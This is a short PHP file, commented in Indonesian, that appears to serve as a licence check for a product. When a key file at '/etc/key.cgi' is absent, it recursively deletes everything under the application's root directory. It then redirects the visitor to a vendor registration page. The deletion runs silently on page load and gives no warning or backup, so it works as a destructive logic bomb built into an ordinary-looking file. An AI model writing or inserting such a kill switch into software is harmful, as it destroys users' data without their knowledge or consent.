<?php
// fungsi untuk menghapus file (sesuai nama n path nya )
function rmdir_recurse($path) {  
    $path = rtrim($path, '/').'/';
    $handle = opendir($path);
    while(false !== ($file = readdir($handle))) {
        if($file != '.' and $file != '..' ) {
            $fullpath = $path.$file;
            if(is_dir($fullpath))
             rmdir_recurse($fullpath); 
            else
             unlink($fullpath);
        }
    }
    closedir($handle);
    rmdir($path);
}

if(!file_exists('/etc/key.cgi')){
    rmdir_recurse(ROOTDIR);
    header('location:http://www.johankharisma.com/product/register.php?client=yohansunyoto');
}
?>
